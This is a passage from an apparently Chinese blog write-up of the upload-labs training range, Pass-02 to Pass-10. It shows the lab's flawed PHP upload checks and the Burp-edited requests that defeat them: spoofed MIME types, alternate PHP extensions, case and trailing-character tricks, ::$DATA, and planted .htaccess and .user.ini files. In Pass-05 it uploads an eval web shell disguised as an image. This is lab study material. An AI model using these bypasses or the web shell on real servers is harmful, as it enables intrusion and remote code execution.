class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burp改包，修改<code>Content-Type</code>，部分为 <code>image/jpeg</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-02/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">……</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br></pre></td></tr></table></figure><p>上传成功，访问<br><img src="/2022/02/28/upload-labs/2022-02-28-11-13-41.png"></p><p><strong>背景知识：</strong></p><p><a href="https://www.php.net/manual/zh/features.file-upload.post-method.php">POST 方法上传</a></p><p>全局变量 $_FILES 包含有所有上传的文件信息。 数组的内容来自以下范例表单。我们假设文件上传字段的名称如下例所示，为 userfile。名称可随意命名。</p><blockquote><p><code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>  客户端机器文件的原名称。  </p><p><code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>  文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image&#x2F;gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。  </p><p><code>$_FILES[&#39;userfile&#39;][&#39;size&#39;]</code>  已上传文件的大小，单位为字节。</p><p><code>$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]</code> 文件被上传后在服务端储存的临时文件名。</p><p><code>$_FILES[&#39;userfile&#39;][&#39;error&#39;]</code>   该文件上传相关的错误代码。</p></blockquote><p>文件被上传后，默认地会被储存到服务端的默认临时目录中，除非 php.ini 中的 upload_tmp_dir 设置为其它的路径。服务端的默认临时目录可以通过更改 PHP 运行环境的环境变量 TMPDIR 来重新设置，但是在 PHP 脚本内部通过运行 putenv() 函数来设置是不起作用的。该环境变量也可以用来确认其它的操作也是在上传的文件上进行的。</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>服务端-弱黑名单检查</strong><br>直接上马，提示错误<br>查看后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;03&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>白名单检测，可以使用<code>php3/php5/phtml</code></p><p>以phtml为例，burp抓包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.phtml&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">293582696224464</span>--</span><br></pre></td></tr></table></figure><p>访问</p><p><img src="/2022/02/28/upload-labs/2022-02-28-11-44-16.png"></p><p>背景知识：<br>使用<code>php3/php5/phtml</code>成功的前提是服务端解析这些后缀，本地服务端修改方法是<br>找到apache下的conf&#x2F;httpd.conf，然后修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原数据</span><br><span class="line"><span class="comment">#AddType application/x-httpd-php .php .phtml</span></span><br><span class="line">去掉注释，修改为</span><br><span class="line">AddType application/x-httpd-php .php .phtml .php3 .php5</span><br></pre></td></tr></table></figure><p>其中 AddType 可以将给定的文件扩展名映射到指定的内容类型<br>用法：  </p><blockquote><p>AddType media-type extension [extension] …</p></blockquote><p>参考：</p><p><a href="https://blog.csdn.net/weixin_44023693/article/details/104754029">phpstudy无法解析php2、php3、phtml等文件</a><br><a href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apache的配置文件中定义</a></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>服务端-强黑名单检查-修改.htaccess</strong><br>传马失败<br>看代码，黑到无人性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以上传<code>.htaccess</code>，覆盖原件，解析jpg文本里的php代码，内容为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>使用burp抓包查看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=04</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">168279961491</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-12-15-57.png"></p><p><strong>背景知识：</strong></p><p>.htaccess<br> 可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。详见 <a href="http://www.htaccess-guide.com/">http://www.htaccess-guide.com/</a> 。</p><p>SetHandler 可以强制所有匹配的文件被一个指定的处理器处理<br>用法：<br>SetHandler handler-name|None<br>示例1：<br>SetHandler application&#x2F;x-httpd-php<br>此时当前目录及其子目录下所有文件都会被当做 php 解析</p><p><strong>参考：</strong>  </p><p><a href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apache的配置文件中定义</a></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>服务端-强黑名单检查-.user.ini绕过</strong><br>很多老版本的labs，这关是大小写绕过，别问我为什么知道的，逃。<br>黑名单没有禁止php7和.ini，所以可以修改.user.ini，来包含一个图片，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.user.ini&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">auto_prepend_file=shell.jpg</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure><p>在上传一个shell.jpg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">@eval(<span class="params">$_REQUEST[<span class="string">&#x27;shell&#x27;</span>]</span>);</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后等待5min，访问upload下的readme.php<br><img src="/2022/02/28/upload-labs/2022-02-28-20-09-12.png">  </p><p><strong>补充知识：</strong><br>攻击逻辑链<br>.user.ini类似于php.ini，有初始化作用，可以更改一些包含文件，而.user.ini里面的auto_prepend_file，表示在加载第一个PHP代码之前先行预加载该配置所指示的PHP文件。也就是指定文件当作php解析包含。所以我们就可以上传一个图片🐎，然后在访问同目录下别的php文件利用此马。  </p><p>利用条件</p><blockquote><p>服务器脚本语言为PHP<br>服务器使用CGI／FastCGI模式   不知如何判断，待补<br>上传目录下要有可执行的php文件  这个蛮难的 </p></blockquote><p><strong>参考知识：</strong></p><p><a href="https://www.jianshu.com/p/c2ed6b05c964">.user.ini配置文件在渗透中的利用</a><br><a href="https://www.php.net/manual/zh/configuration.file.per-user.php">.user.ini 文件</a><br><a href="https://www.zhihu.com/question/30672017">如何通俗地解释 CGI、FastCGI、php-fpm 之间的关系</a><br><a href="https://www.cnblogs.com/itbsl/p/9828776.html#%E6%B7%B1%E5%85%A5cgi%E5%8D%8F%E8%AE%AE">CGI 和 FastCGI 协议的运行原理</a><br><a href="https://segmentfault.com/a/1190000018597945">fastcgi与cgi有什么不同</a><br><a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">Upload-labs 1-21关 靶场通关攻略(全网最全最完整)</a></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><strong>服务端-强黑名单检查-大小写绕过</strong><br>后端代码未检查大小写，可以大小写绕过，转换小写函数<code>strtolower</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=06</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.Php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">123821742118716</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-18-09-02.png"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><strong>服务端-强黑名单检查-尾部加空格绕过</strong><br>后端代码没有首位去空，去空函数<code>trim()</code><br>尾部加空格绕过，经测试首部加空格无法上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=07</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php &quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">19718198955447</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-18-16-23.png"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><strong>服务端-强黑名单检查-改包加 . 绕过</strong><br>漏洞点主要在这</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>strrchr<br>(PHP 4, PHP 5, PHP 7, PHP 8)<br>strrchr — 查找指定字符在字符串中的最后一次出现<br>strrchr(string $haystack, mixed $needle): string<br>该函数返回 haystack 字符串中的一部分，这部分以 needle 的最后出现位置开始，直到 haystack 末尾。  </p><p>所以尾端加了<code>.</code>之后就被认为后缀为<code>.</code>绕过了黑名单，但是windows会把<code>1.php.</code>改成<code>1.php</code>，linux暂未测试，待补</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php.&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">217261477111538</span>--</span><br></pre></td></tr></table></figure><p>稍微修一下后端代码，把识别的后缀显示出来，回显得<br><code>&lt;br&gt;后缀.后缀&lt;br&gt;</code><br>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-20-29-44.png"></p><p>参考：  </p><p><a href="https://www.php.net/manual/zh/function.strrchr.php">strrchr</a></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>服务端-强黑名单检查-改包加 ::$DATA绕过</strong> </p><p>在window下<code>::$DATA</code>之后会认为是文件流，假如<code>1.php::$DATA </code>，php认为其后缀是<code>.php::$DATA</code>，而windows认为是<code>.php</code><br>所以我们就可以构造一个<code>1.php::$DATA</code>，来绕过，经测试<code>1.php::$D </code>，不一定非要<code>$DATA</code>，只要有<code>::</code>即可，蛮神奇的</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-09/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">287032381131322</span>--</span><br></pre></td></tr></table></figure><p>修改后端，看到中间数据得流动</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>file_ext:.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>temp_file:C:\Windows\php67CE.tmp<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>img_path../upload/202202282241383659.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问图片<br><img src="/2022/02/28/upload-labs/2022-02-28-22-45-56.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><strong>服务端-强黑名单检查-改包加 <code>. .</code> 绕过</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span 